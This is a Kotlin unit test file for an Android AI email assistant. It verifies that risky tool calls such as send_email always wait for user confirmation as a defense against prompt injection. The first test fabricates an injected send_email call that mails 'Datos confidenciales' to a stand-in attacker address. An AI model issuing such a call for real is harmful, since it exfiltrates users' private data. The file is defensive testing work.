package com.example.ui

import android.app.Application
import androidx.test.core.app.ApplicationProvider
import com.example.data.local.RisoDatabase
import com.example.data.model.AppSetting
import com.example.data.model.ChatSession
import com.example.service.llm.GeminiFunctionCall
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.runBlocking
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertTrue
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.Shadows
import org.robolectric.annotation.Config

@RunWith(RobolectricTestRunner::class)
@Config(sdk = [36])
class PromptInjectionProtectionTest {

    @Test
    fun `send_email creates PendingAction even when planningMode is false`() = runBlocking {
        val app = ApplicationProvider.getApplicationContext<Application>()
        val db = RisoDatabase.getDatabase(app)
        val dao = db.risoDao()

        dao.deleteAllPendingActions()
        dao.insertSetting(AppSetting("planning_mode", "false"))
        val session = ChatSession(id = "test_session_direct", title = "Test", llmProvider = "Gemini")
        dao.insertSession(session)

        val viewModel = RisoViewModel(app)
        viewModel.setPlanningMode(false)
        // Allow init coroutine tasks on Main looper to settle
        repeat(5) {
            Shadows.shadowOf(android.os.Looper.getMainLooper()).idle()
            delay(20)
        }
        viewModel.setPlanningMode(false)
        assertFalse("planningMode should be false (Direct Mode)", viewModel.planningMode.value)

        val call = GeminiFunctionCall(
            name = "send_email",
            args = mapOf(
                "to" to "atacante@malicious.example",
                "subject" to "Datos confidenciales",
                "body" to "Contenido exfiltrado por inyección de prompts"
            )
        )

        viewModel.handleFunctionCalling(session.id, call)

        val actions = dao.getAllPendingActionsReactive().first()
        val sendAction = actions.firstOrNull { it.functionName == "send_email" }
        assertNotNull("send_email must create a PendingAction when planningMode = false", sendAction)
        assertEquals("PENDING", sendAction?.status)
        assertTrue(
            "PendingAction argumentsJson must retain recipient, subject, and body",
            sendAction?.argumentsJson?.contains("atacante@malicious.example") == true &&
                sendAction.argumentsJson.contains("Datos confidenciales")
        )
    }

    @Test
    fun `low risk write executes without PendingAction when planningMode is false`() = runBlocking {
        val app = ApplicationProvider.getApplicationContext<Application>()
        val db = RisoDatabase.getDatabase(app)
        val dao = db.risoDao()

        dao.deleteAllPendingActions()
        dao.insertSetting(AppSetting("planning_mode", "false"))
        val session = ChatSession(id = "test_session_low_risk", title = "Test", llmProvider = "Gemini")
        dao.insertSession(session)

        val viewModel = RisoViewModel(app)
        viewModel.setPlanningMode(false)
        repeat(5) {
            Shadows.shadowOf(android.os.Looper.getMainLooper()).idle()
            delay(20)
        }
        viewModel.setPlanningMode(false)
        assertFalse(viewModel.planningMode.value)

        val lowRiskCall = GeminiFunctionCall(
            name = "mark_as_read",
            args = mapOf("id" to "msg_101")
        )

        viewModel.handleFunctionCalling(session.id, lowRiskCall)

        val actions = dao.getAllPendingActionsReactive().first()
        assertTrue(
            "mark_as_read should execute directly without creating a PendingAction when planningMode = false",
            actions.none { it.functionName == "mark_as_read" }
        )
    }

    @Test
    fun `always confirm and low risk groups match policy and L10n text is updated`() {
        assertEquals(
            setOf(
                "send_email",
                "reply_to_email",
                "forward_email",
                "delete_email",
                "create_github_issue",
                "create_gitlab_issue"
            ),
            RisoViewModel.ALWAYS_CONFIRM
        )
        assertEquals(
            setOf("mark_as_read", "mark_as_unread", "archive_email"),
            RisoViewModel.LOW_RISK_WRITE
        )
        assertEquals(
            "Modo Directo (acciones de bajo riesgo sin confirmar)",
            L10n.t("planning_mode_off", isEn = false)
        )
    }
}
